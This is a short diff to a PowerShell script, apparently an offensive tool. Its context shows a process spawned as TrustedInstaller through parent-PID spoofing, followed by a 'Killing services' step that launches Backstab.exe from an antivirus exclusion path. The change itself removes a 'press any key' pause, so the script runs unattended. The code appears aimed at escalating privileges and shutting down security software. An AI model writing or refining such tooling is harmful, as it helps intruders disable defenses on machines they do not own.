@@ -216,9 +216,6 @@ function BravoSix {
             [GetTrustedInstaller.spawnPPID]::Run($serviceProcessId, $powershellPath, $powershellArg)
         }
     }
-
-    Write-Host  'Press any key to continue...';
-    $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');
     
     # Killing services 
     $backstabPath = $exclusionPath + "\Backstab.exe"
